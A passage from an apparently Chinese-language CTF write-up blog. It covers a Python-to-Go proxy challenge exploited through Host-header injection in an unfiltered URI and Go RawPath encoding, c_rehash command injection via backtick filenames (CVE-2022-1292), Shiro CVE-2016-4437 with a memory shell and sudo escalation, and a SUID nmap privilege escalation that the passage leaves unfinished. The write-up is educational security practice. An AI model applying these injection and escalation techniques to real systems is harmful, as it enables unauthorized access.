class="string">&quot;hello world&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	router := gin.Default()</span><br><span class="line">	router.GET(<span class="string">&quot;/&quot;</span>, index)</span><br><span class="line">	router.GET(<span class="string">&quot;/admin/rename&quot;</span>, admin)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := router.Run(<span class="string">&quot;:8887&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">my</span> $dir = <span class="string">&quot;/usr/lib/ssl&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $prefix = <span class="string">&quot;/usr&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $errorcount = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">my</span> $openssl = $ENV<span class="string">&#123;OPENSSL&#125;</span> || <span class="string">&quot;openssl&quot;</span>;</span><br><span class="line"><span class="keyword">my</span> $pwd;</span><br><span class="line"><span class="keyword">my</span> $verbose = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">my</span> $symlink_exists=<span class="keyword">eval</span> &#123;<span class="keyword">symlink</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>); <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">my</span> $removelinks = <span class="number">1</span>;</span><br><span class="line"><span class="comment">##  Parse flags.</span></span><br><span class="line"><span class="keyword">while</span> ( $ARGV[<span class="number">0</span>] =~ <span class="regexp">/^-/</span> ) &#123;</span><br><span class="line">    <span class="keyword">my</span> $flag = <span class="keyword">shift</span> @ARGV;</span><br><span class="line">    <span class="keyword">last</span> <span class="keyword">if</span> ( $flag eq <span class="string">&#x27;--&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( $flag eq <span class="string">&#x27;-h&#x27;</span> || $flag eq <span class="string">&#x27;-help&#x27;</span> ) &#123;</span><br><span class="line">	    help();</span><br><span class="line">    &#125; <span class="keyword">elsif</span> ( $flag eq <span class="string">&#x27;-n&#x27;</span>)&#123;</span><br><span class="line">		$removelinks = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">elsif</span> ( $flag eq <span class="string">&#x27;-v&#x27;</span> ) &#123;</span><br><span class="line">	    $verbose++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="keyword">print</span> STDERR <span class="string">&quot;Usage error; try -h.\n&quot;</span>;</span><br><span class="line">	    <span class="keyword">exit</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">help</span> </span>&#123;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;Usage: c_rehash [-old] [-h] [-help] [-v] [dirs...]\n&quot;</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;   -old use old-style digest\n&quot;</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;   -h or -help print this help text\n&quot;</span>;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;   -v print files removed and linked\n&quot;</span>;</span><br><span class="line">	<span class="keyword">exit</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span> <span class="string">&quot;require Cwd&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">defined</span>(&amp;Cwd::getcwd)) &#123;</span><br><span class="line">	$pwd=Cwd::getcwd();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$pwd=<span class="string">`pwd`</span>;</span><br><span class="line">	<span class="keyword">chomp</span>($pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># DOS/Win32 or Unix delimiter?  Prefix our installdir, then search.</span></span><br><span class="line"><span class="keyword">my</span> $path_delim = ($pwd =~ <span class="regexp">/^[a-z]\:/i</span>) ? <span class="string">&#x27;;&#x27;</span> : <span class="string">&#x27;:&#x27;</span>;</span><br><span class="line">$ENV<span class="string">&#123;PATH&#125;</span> = <span class="string">&quot;$prefix/bin&quot;</span> . ($ENV<span class="string">&#123;PATH&#125;</span> ? $path_delim . $&#123;PATH&#125; : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! -<span class="keyword">x</span> $openssl) &#123;</span><br><span class="line">	<span class="keyword">my</span> $found = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="keyword">split</span> <span class="regexp">/$path_delim/</span>, $ENV<span class="string">&#123;PATH&#125;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (-<span class="keyword">x</span> <span class="string">&quot;$_/$openssl&quot;</span>) </span><br><span class="line">		&#123;</span><br><span class="line">			$found = <span class="number">1</span>;</span><br><span class="line">			$openssl = <span class="string">&quot;$_/$openssl&quot;</span>;</span><br><span class="line">			<span class="keyword">last</span>;</span><br><span class="line">		&#125;	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($found == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">print</span> STDERR <span class="string">&quot;c_rehash: rehashing skipped (&#x27;openssl&#x27; program not available)\n&quot;</span>;</span><br><span class="line">		<span class="keyword">exit</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@ARGV) &#123;</span><br><span class="line">	@dirlist = @ARGV;</span><br><span class="line">&#125; <span class="keyword">elsif</span> ($ENV<span class="string">&#123;SSL_CERT_DIR&#125;</span>) &#123;</span><br><span class="line">	@dirlist = <span class="keyword">split</span> <span class="regexp">/$path_delim/</span>, $ENV<span class="string">&#123;SSL_CERT_DIR&#125;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$dirlist[<span class="number">0</span>] = <span class="string">&quot;$dir/certs&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (-d $dirlist[<span class="number">0</span>]) &#123;</span><br><span class="line">	<span class="keyword">chdir</span> $dirlist[<span class="number">0</span>];</span><br><span class="line">	$openssl=<span class="string">&quot;$pwd/$openssl&quot;</span> <span class="keyword">if</span> (!-<span class="keyword">x</span> $openssl);</span><br><span class="line">	<span class="keyword">chdir</span> $pwd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (@dirlist) &#123;</span><br><span class="line">	<span class="keyword">if</span> (-d $_ ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( -w $_) &#123;</span><br><span class="line">		hash_dir($_);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">print</span> <span class="string">&quot;Skipping $_, can&#x27;t write\n&quot;</span>;</span><br><span class="line">                $errorcount++;</span><br><span class="line">            &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>($errorcount);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">hash_dir</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> %hashlist;</span><br><span class="line">	<span class="keyword">print</span> <span class="string">&quot;Doing $_[0]\n&quot;</span>;</span><br><span class="line">	<span class="keyword">chdir</span> $_[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">opendir</span>(DIR, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">	<span class="keyword">my</span> @flist = <span class="keyword">sort</span> <span class="keyword">readdir</span>(DIR);</span><br><span class="line">	<span class="keyword">closedir</span> DIR;</span><br><span class="line">	<span class="keyword">if</span> ( $removelinks ) &#123;</span><br><span class="line">		<span class="comment"># Delete any existing symbolic links</span></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">grep</span> &#123;<span class="regexp">/^[\da-f]+\.r&#123;0,1&#125;\d+$/</span>&#125; @flist) &#123;</span><br><span class="line">			<span class="keyword">if</span> (-l $_) &#123;</span><br><span class="line">				<span class="keyword">print</span> <span class="string">&quot;unlink $_&quot;</span> <span class="keyword">if</span> $verbose;</span><br><span class="line">				<span class="keyword">unlink</span> $_ || <span class="keyword">warn</span> <span class="string">&quot;Can&#x27;t unlink $_, $!\n&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE: <span class="keyword">foreach</span> $fname (<span class="keyword">grep</span> &#123;<span class="regexp">/\.(pem)|(crt)|(cer)|(crl)$/</span>&#125; @flist) &#123;</span><br><span class="line">		<span class="comment"># Check to see if certificates and/or CRLs present.</span></span><br><span class="line">		<span class="keyword">my</span> ($cert, $crl) = check_file($fname);</span><br><span class="line">		<span class="keyword">if</span> (!$cert &amp;&amp; !$crl) &#123;</span><br><span class="line">			<span class="keyword">print</span> STDERR <span class="string">&quot;WARNING: $fname does not contain a certificate or CRL: skipping\n&quot;</span>;</span><br><span class="line">			<span class="keyword">next</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		link_hash_cert($fname) <span class="keyword">if</span> ($cert);</span><br><span class="line">		link_hash_cert_old($fname) <span class="keyword">if</span> ($cert);</span><br><span class="line">		link_hash_crl($fname) <span class="keyword">if</span> ($crl);</span><br><span class="line">		link_hash_crl_old($fname) <span class="keyword">if</span> ($crl);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">check_file</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($is_cert, $is_crl) = (<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">my</span> $fname = $_[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">open</span> IN, $fname;</span><br><span class="line">	<span class="keyword">while</span>(&lt;IN&gt;) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="regexp">/^-----BEGIN (.*)-----/</span>) &#123;</span><br><span class="line">			<span class="keyword">my</span> $hdr = $1;</span><br><span class="line">			<span class="keyword">if</span> ($hdr =~ <span class="regexp">/^(X509 |TRUSTED |)CERTIFICATE$/</span>) &#123;</span><br><span class="line">				$is_cert = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">last</span> <span class="keyword">if</span> ($is_crl);</span><br><span class="line">			&#125; <span class="keyword">elsif</span> ($hdr eq <span class="string">&quot;X509 CRL&quot;</span>) &#123;</span><br><span class="line">				$is_crl = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">last</span> <span class="keyword">if</span> ($is_cert);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">close</span> IN;</span><br><span class="line">	<span class="keyword">return</span> ($is_cert, $is_crl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">link_hash_cert</span> </span>&#123;</span><br><span class="line">		<span class="keyword">my</span> $fname = $_[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">my</span> $x509hash = $_[<span class="number">1</span>] || <span class="string">&#x27;-subject_hash&#x27;</span>;</span><br><span class="line">		$fname =~ <span class="regexp">s/&#x27;/&#x27;\\&#x27;&#x27;/g</span>;</span><br><span class="line">		<span class="keyword">my</span> ($hash, $fprint) = <span class="string">`&quot;$openssl&quot; x509 $x509hash -fingerprint -noout -in &quot;$fname&quot;`</span>;</span><br><span class="line">		<span class="keyword">chomp</span> $hash;</span><br><span class="line">		<span class="keyword">chomp</span> $fprint;</span><br><span class="line">		$fprint =~ <span class="regexp">s/^.*=//</span>;</span><br><span class="line">		$fprint =~ <span class="regexp">tr/://d</span>;</span><br><span class="line">		<span class="keyword">my</span> $suffix = <span class="number">0</span>;</span><br><span class="line">		<span class="comment"># Search for an unused hash filename</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">exists</span> $hashlist&#123;<span class="string">&quot;$hash.$suffix&quot;</span>&#125;) &#123;</span><br><span class="line">			<span class="comment"># Hash matches: if fingerprint matches its a duplicate cert</span></span><br><span class="line">			<span class="keyword">if</span> ($hashlist&#123;<span class="string">&quot;$hash.$suffix&quot;</span>&#125; eq $fprint) &#123;</span><br><span class="line">				<span class="keyword">print</span> STDERR <span class="string">&quot;WARNING: Skipping duplicate certificate $fname\n&quot;</span>;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$suffix++;</span><br><span class="line">		&#125;</span><br><span class="line">		$hash .= <span class="string">&quot;.$suffix&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span> ($symlink_exists) &#123;</span><br><span class="line">			<span class="keyword">print</span> <span class="string">&quot;link $fname -&gt; $hash\n&quot;</span> <span class="keyword">if</span> $verbose;</span><br><span class="line">			<span class="keyword">symlink</span> $fname, $hash || <span class="keyword">warn</span> <span class="string">&quot;Can&#x27;t symlink, $!&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">print</span> <span class="string">&quot;copy $fname -&gt; $hash\n&quot;</span> <span class="keyword">if</span> $verbose;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">open</span>($in, <span class="string">&quot;&lt;&quot;</span>, $fname)) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (<span class="keyword">open</span>($out,<span class="string">&quot;&gt;&quot;</span>, $hash)) &#123;</span><br><span class="line">                                <span class="keyword">print</span> $out $_ <span class="keyword">while</span> (&lt;$in&gt;);</span><br><span class="line">                                <span class="keyword">close</span> $out;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">warn</span> <span class="string">&quot;can&#x27;t open $hash for write, $!&quot;</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">close</span> $in;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            <span class="keyword">warn</span> <span class="string">&quot;can&#x27;t open $fname for read, $!&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$hashlist&#123;$hash&#125; = $fprint;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">link_hash_cert_old</span> </span>&#123;</span><br><span class="line">		link_hash_cert($_[<span class="number">0</span>], <span class="string">&#x27;-subject_hash_old&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">link_hash_crl_old</span> </span>&#123;</span><br><span class="line">		link_hash_crl($_[<span class="number">0</span>], <span class="string">&#x27;-hash_old&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Same as above except for a CRL. CRL links are of the form &lt;hash&gt;.r&lt;n&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">link_hash_crl</span> </span>&#123;</span><br><span class="line">		<span class="keyword">my</span> $fname = $_[<span class="number">0</span>];</span><br><span class="line">		<span class="keyword">my</span> $crlhash = $_[<span class="number">1</span>] || <span class="string">&quot;-hash&quot;</span>;</span><br><span class="line">		$fname =~ <span class="regexp">s/&#x27;/&#x27;\\&#x27;&#x27;/g</span>;</span><br><span class="line">		<span class="keyword">my</span> ($hash, $fprint) = <span class="string">`&quot;$openssl&quot; crl $crlhash -fingerprint -noout -in &#x27;$fname&#x27;`</span>;</span><br><span class="line">		<span class="keyword">chomp</span> $hash;</span><br><span class="line">		<span class="keyword">chomp</span> $fprint;</span><br><span class="line">		$fprint =~ <span class="regexp">s/^.*=//</span>;</span><br><span class="line">		$fprint =~ <span class="regexp">tr/://d</span>;</span><br><span class="line">		<span class="keyword">my</span> $suffix = <span class="number">0</span>;</span><br><span class="line">		<span class="comment"># Search for an unused hash filename</span></span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">exists</span> $hashlist&#123;<span class="string">&quot;$hash.r$suffix&quot;</span>&#125;) &#123;</span><br><span class="line">			<span class="comment"># Hash matches: if fingerprint matches its a duplicate cert</span></span><br><span class="line">			<span class="keyword">if</span> ($hashlist&#123;<span class="string">&quot;$hash.r$suffix&quot;</span>&#125; eq $fprint) &#123;</span><br><span class="line">				<span class="keyword">print</span> STDERR <span class="string">&quot;WARNING: Skipping duplicate CRL $fname\n&quot;</span>;</span><br><span class="line">				<span class="keyword">return</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$suffix++;</span><br><span class="line">		&#125;</span><br><span class="line">		$hash .= <span class="string">&quot;.r$suffix&quot;</span>;</span><br><span class="line">		<span class="keyword">if</span> ($symlink_exists) &#123;</span><br><span class="line">			<span class="keyword">print</span> <span class="string">&quot;link $fname -&gt; $hash\n&quot;</span> <span class="keyword">if</span> $verbose;</span><br><span class="line">			<span class="keyword">symlink</span> $fname, $hash || <span class="keyword">warn</span> <span class="string">&quot;Can&#x27;t symlink, $!&quot;</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">print</span> <span class="string">&quot;cp $fname -&gt; $hash\n&quot;</span> <span class="keyword">if</span> $verbose;</span><br><span class="line">			<span class="keyword">system</span> (<span class="string">&quot;cp&quot;</span>, $fname, $hash);</span><br><span class="line">                        <span class="keyword">warn</span> <span class="string">&quot;Can&#x27;t copy, $!&quot;</span> <span class="keyword">if</span> ($? &gt;&gt; <span class="number">8</span>) != <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		$hashlist&#123;$hash&#125; = $fprint;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（什么jb语言没见过相似）</p>
<p>照着wp慢慢来源码分析</p>
<p>python的是外网的源码，在&#x2F;的路由可以传入一系列数据</p>
<p>然后在&#x2F;getcrt得到crt的证书地址</p>
<p>在&#x2F;proxy路由里面可以得到访问结果</p>
<p>然后在&#x2F;createlink建立链接</p>
<p>内网是一个go语言书写的框架，对外网&#x2F;proxy访问有反应</p>
<p>可以使用&#x2F;admin&#x2F;rename路由去修改名字</p>
<p>注意到在python的&#x2F;proxy</p>
<p>像内网发包的时候只是进行了url的简单拼接，并没有实际的检验</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  msg = f&#x27;&#x27;&#x27;GET &#123;uri&#125; </span><br><span class="line">    HTTP/1.1</span><br><span class="line">Host: test_api_host</span><br><span class="line">User-Agent: Guest</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>在这里可以构造问题语句</p>
<p>直接构造url&#x3D;&#x2F;admin&#x2F;rename去访问后端路由</p>
<p>go后端只是简单的检验了</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> c.Request.URL.RawPath != <span class="string">&quot;&quot;</span> &amp;&amp; c.Request.Host == <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">		err := os.Rename(staticPath+oldname, staticPath+newname)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>路径是否为空和host是否为admin</p>
<h3 id="url注入http头"><a href="#url注入http头" class="headerlink" title="url注入http头"></a>url注入http头</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Request.Host为请求的host头，在python中请求包中host头是固定的(test_host_api)，这里我们需要想办法让go后端认为host值为admin</span><br><span class="line"></span><br><span class="line">python在代理请求时直接使用了socket发送raw数据包，在数据包&#123;uri&#125;处没有过滤，所以我们可以在uri注入一个host头来替换原本的头</span><br><span class="line">GET / HTTP /1.1</span><br><span class="line">Host: admin</span><br><span class="line">User-Agent: Guest</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP /1.1</span><br><span class="line">Host: test_api_host</span><br><span class="line">User-Agent: Guest</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<h3 id="go的RawPath特性"><a href="#go的RawPath特性" class="headerlink" title="go的RawPath特性"></a>go的RawPath特性</h3><p>Request.URL.RawPath检验，有一个特性</p>
<p>go语言中会对原始url进行解码(反转义)，如果解码后再编码的url和原始url不同，那么RawPath会被设置为原始url，反之会被设置为空</p>
<p>将一个被url编码的&#x2F;转换为原始的，就可以避免被制空</p>
<h3 id="c-rehash命令执行-C-VE-2022-1292"><a href="#c-rehash命令执行-C-VE-2022-1292" class="headerlink" title="c_rehash命令执行       C VE-2022-1292"></a>c_rehash命令执行       C VE-2022-1292</h3><p>在生成软连接的时候，文件的名字拼接过程没有过滤反引号&#96;,存在rce的可能</p>
<p>构造</p>
<p>恶意的文件名字，拼接到文件中去，实现rce</p>
<h2 id="15-nepctf2023-ez-java-checkin"><a href="#15-nepctf2023-ez-java-checkin" class="headerlink" title="15.[nepctf2023]ez_java_checkin"></a>15.[nepctf2023]ez_java_checkin</h2><p>提示是一个很老的cve</p>
<p>抓包看到cookie有一个remerner，name什么的cookies很奇怪</p>
<p>上网查询</p>
<h3 id="CVE-2016-4437"><a href="#CVE-2016-4437" class="headerlink" title="CVE-2016-4437"></a>CVE-2016-4437</h3><p>一把梭</p>
<p>写一个内存马</p>
<p><img src="C:\Users\lenovo\Desktop\life\学习wp\123.png" alt="123"></p>
<p>然后sudo提权</p>
<p><img src="C:\Users\lenovo\Desktop\life\学习wp\12323.png" alt="12323"></p>
<h2 id="16-nepctf2023-独步天下-转生成为镜花水月中的王者"><a href="#16-nepctf2023-独步天下-转生成为镜花水月中的王者" class="headerlink" title="16.[nepctf2023]独步天下-转生成为镜花水月中的王者"></a>16.[nepctf2023]独步天下-转生成为镜花水月中的王者</h2><p>第一次渗透</p>
<p>上来whoami测试了下结果是pwn</p>
<p>几乎没啥权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total 8 drwxr-xr-x 2 0 0 0 Jul 17 09:46 bin drwxr-xr-x 7 0 0 2260 Aug 12 06:29 dev drwxr-xr-x 2 0 0 0 Jul 17 09:46 etc -rwxr----- 1 0 0 72 Jul 17 09:46 flag drwxr-xr-x 3 0 0 0 Jul 17 09:46 home -rwxr-xr-x 1 0 0 423 Jul 17 09:58 init drwxr-xr-x 3 0 0 0 Jul 17 09:46 lib drwxr-xr-x 2 0 0 0 Jul 17 09:46 lib64 lrwxrwxrwx 1 0 0 11 Jul 17 09:46 linuxrc -&gt; bin/busybox dr-xr-xr-x 99 0 0 0 Aug 12 06:29 proc drwx------ 2 0 0 0 Jun 9 14:24 root drwxr-xr-x 2 0 0 0 Jul 17 09:46 sbin dr-xr-xr-x 12 0 0 0 Aug 12 06:29 sys drwxrwxrwt 2 0 0 40 Aug 12 06:29 tmp drwxr-xr-x 4 0 0 0 Jul 17 09:46 usr</span><br></pre></td></tr></table></figure>

<p>看了下都没权限</p>
<p>尝试使用suid提权，发现一个nmap有权限进行调用</p>
<p>上nmap 去尝试建立一个交互式反应</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>

<p>然而发现跳出来一个</p>
<p> ports-alive不存在</p>
<p>这里需要用点活</p>
<h3 id="环境注入"><a href="#环境注入" class="headerlink" title="环境注入"></a>环境注入</h3><p>在这里namp调用的时候 ports-alive不存在</p>
